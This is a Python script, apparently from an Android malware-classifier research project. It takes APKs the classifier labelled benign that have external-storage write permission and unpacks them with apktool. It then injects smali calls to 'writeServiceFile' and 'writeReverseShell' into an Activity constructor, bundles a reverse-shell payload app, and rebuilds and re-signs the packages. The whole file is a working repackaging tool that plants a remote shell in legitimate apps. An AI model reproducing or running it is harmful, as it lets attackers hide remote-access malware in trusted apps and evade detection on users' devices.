import os
import time
import subprocess

key_store_path = "/home/elad/Desktop/AndroidAttack/attack/mykey.keystore"
beta_attck_proj = "/home/elad/Desktop/AndroidAttack/attack/beta_attack_app/"
unpack_attack = beta_attck_proj + "unpack_attack_apk/"

ANDRODfa = "/home/elad/Desktop/AndroidAttack/ANDRODfa/"
apk_dict = ANDRODfa + "apk_dict.txt"
workspace = ANDRODfa + "workspace/"
pkgs_dir = ANDRODfa + "after_data_collection/"
pkgs_attacked_dir = ANDRODfa + "attack_after_data_collection"


def read_attack_functions():
    inject_function_path = "/home/elad/Desktop/AndroidAttack/attack/smali_inject_code"
    f = open(inject_function_path, "r")
    res = f.read()
    f.close()
    return res


#  stuff to copy into benign unpack apk
reverse_shell_app = unpack_attack + "res/raw/attack_app"
inject_function_content = read_attack_functions()


def findPackageName(fileName):
    bashCommand = "aapt dump badging " + fileName + " | grep package"
    try:
        proc = os.popen(bashCommand).read()
        commandSplit = str(proc).split()
        if len(commandSplit) >= 2:
            name = commandSplit[1].split("=")
            if len(name) >= 2:
                name = name[1].replace("'", "")
            else:
                return -1
        else:
            return -1
        return name
    except Exception:
        return -1


def cut_to_dir(path: str):
    flag = False
    res = ''
    for char in path[::-1]:
        if flag:
            res += char
            break
        elif char == '/':
            res += char
            flag = True
    return res[::-1]


def find_where_to_inject(unpack_dir_path):
    # find all classes files extend activity
    potential_paths = os.popen(f"grep -Ril '.super Landroid/app/Activity;' {unpack_dir_path}/smali").readlines()
    for path in potential_paths:
        res = os.popen(f"cat {path}").read()
        if res is not None and ".method public constructor <init>()V" in res:
            return path.replace("\n", "")

    return "ERROR"


def find_L_package(inject_file_path):
    f = open(inject_file_path, "r")
    prev = None
    curr = f.readline()
    while ".super Landroid/app/Activity;" not in curr:
        prev = curr
        curr = f.readline()
    f.close()
    return prev.split()[2]


#  This function scrap the attack inject file and find line to inject the call of th attack
def find_line_of_calls(file_path):
    f = open(file_path, "r")
    i = 1
    find_constructor = False
    for line in f.readlines():
        if ".method public constructor <init>()V" in line:
            find_constructor = True
        if find_constructor and "Landroid/app/Activity;-><init>()V" in line:
            f.close()
            return i
        i += 1


#  Check if there is res folder if yes, Check if there is /res/raw if yes exit else create those folders
def res_dir_handle(unpack_dir_path):
    res = False
    for _dir in os.listdir(unpack_dir_path):
        if "res" == _dir:
            res = True
            break
    if res:
        for _dir in os.listdir(unpack_dir_path + "/res"):
            if "raw" == _dir:
                return
    else:
        os.mkdirs(unpack_dir_path + "/res/raw")
        return

    os.mkdir(unpack_dir_path + "/res/raw")  # in case it didn't find raw


def build_and_sign(pkg_folder_path):
    apk_name = None
    csv_name = None
    for file in os.listdir(pkg_folder_path):
        if ".apk" in file:
            apk_name = file
        if ".csv" in file:
            csv_name = file
    if csv_name:  # if we found any csv from previews run remove it
        os.popen(f"rm {pkg_folder_path}/{csv_name}")
    if not apk_name:
        apk_name = "out.apk"
    os.popen(f"apktool b {pkg_folder_path}/unpack_benign -f -o {apk_name}")
    os.popen(f"jarsigner -signedjar \"{apk_name}\" -keystore {key_store_path} \"{apk_name}\" bob")


def destroy():
    for folder in os.listdir(workspace):
        inject_file_path = find_where_to_inject(workspace + folder + "/unpack_benign")
        if inject_file_path == "ERROR": continue
        print(inject_file_path)
        L_package = find_L_package(inject_file_path)
        service_call = "    invoke-static {}, " + L_package + "->writeServiceFile()V\n"
        reverse_shell_call = "  invoke-static {}, " + L_package + "->writeReverseShell()V\n"

        line_to_inject_calls = find_line_of_calls(inject_file_path)
        try:
            subprocess.check_output(f"sed -i '{line_to_inject_calls}G' {inject_file_path}", stderr=subprocess.STDOUT,
                                    shell=True)
            subprocess.check_output(f"sed -i '{line_to_inject_calls + 1}i {service_call}' {inject_file_path}",
                                    stderr=subprocess.STDOUT,
                                    shell=True)
            subprocess.check_output(f"sed -i '{line_to_inject_calls + 1}i {reverse_shell_call}' {inject_file_path}",
                                    stderr=subprocess.STDOUT,
                                    shell=True)
        except subprocess.CalledProcessError as e:
            print(e)
        # os.popen(f"sed -i '{line_to_inject_calls}G' {inject_file_path}")
        # os.popen(f"sed -i '{line_to_inject_calls + 1}i {service_call}' {inject_file_path}")
        # os.popen(f"sed -i '{line_to_inject_calls + 1}i {reverse_shell_call}' {inject_file_path}")

        with open(inject_file_path, "a+") as f:
            f.write("\n")
            f.write(inject_function_content)

        res_dir_handle(workspace + folder + "/unpack_benign")  # check if res/raw exist if not create it
        os.popen(f"cp {reverse_shell_app} {workspace + folder}/unpack_benign/res/raw")


#  Helper function for cp_benign
def check_benign(apk_path, only_apk_name):
    try:
        perm = os.popen(f"aapt d permissions {apk_path}").read()
        apk_hash = os.popen(f"sha256sum {apk_path}").read().split()[0]
        benign = os.popen(f"cat {apk_dict} | grep {apk_hash}").read().split(",")[1]
        other = os.popen(f"find {pkgs_attacked_dir} | grep .apk").read()
        if ("MANAGE_EXTERNAL_STORAGE" in perm or "WRITE_EXTERNAL_STORAGE" in perm) and benign == "benign\n" and only_apk_name not in other:
            return True
    except Exception as e:
        print(e)
        return False
    return False


#  This function used for find benign apk files with permission to write_external_storage
#  which the classifier already train and classify as benign
#  And copy it to workspace folder for unpacking with apktool and attack them
def cp_benign(size_to_unpack):
    curr_count = 0
    for apk_dir in os.listdir(pkgs_dir):
        if curr_count >= size_to_unpack:
            break
        apkName = None
        for file in os.listdir(pkgs_dir + apk_dir):
            if "apk" in file:
                apkName = file
                break
        if check_benign(pkgs_dir + apk_dir + "/" + apkName, apkName):
            os.popen("cp -r " + pkgs_dir + apk_dir + " " + workspace)
            curr_count += 1


# cp_benign(50)
destroy()
